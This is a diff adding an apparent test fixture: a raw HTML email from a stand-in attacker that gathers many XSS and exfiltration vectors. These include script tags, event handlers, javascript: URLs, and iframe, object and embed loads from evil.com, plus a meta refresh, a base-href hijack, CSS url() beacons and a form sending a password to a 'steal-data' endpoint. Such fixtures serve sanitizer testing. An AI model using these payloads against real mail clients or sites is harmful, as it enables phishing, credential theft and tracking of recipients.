@@ -1,0 +1,32 @@
+From: attacker@evil.com
+To: victim@example.com
+Subject: Click here for free money!!!
+Date: Sun, 15 Dec 2024 10:00:00 -0800
+Message-ID: <malicious@evil.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html>
+<head>
+<script>alert('XSS')</script>
+<style>body { background: url('https://evil.com/track?victim=1'); }</style>
+</head>
+<body onload="alert('body onload XSS')">
+<h1 onclick="alert('click XSS')">Hello!</h1>
+<img src="https://evil.com/tracking-pixel.gif" onerror="alert('img onerror XSS')">
+<img src="javascript:alert('javascript src XSS')">
+<a href="javascript:alert('javascript href XSS')">Click me</a>
+<a href="https://evil.com/phishing" target="_blank">Legit looking link</a>
+<iframe src="https://evil.com/malware.html"></iframe>
+<form action="https://evil.com/steal-data"><input name="password"></form>
+<svg onload="alert('svg XSS')"><script>alert('svg script')</script></svg>
+<math><maction actiontype="statusline#http://evil.com">test</maction></math>
+<meta http-equiv="refresh" content="0;url=https://evil.com">
+<base href="https://evil.com/">
+<link rel="stylesheet" href="https://evil.com/evil.css">
+<object data="https://evil.com/malware.swf"></object>
+<embed src="https://evil.com/malware.swf">
+<p style="background: url('https://evil.com/css-exfil')">Styled text</p>
+<div data-custom="test">Data attribute</div>
+</body>
+</html>
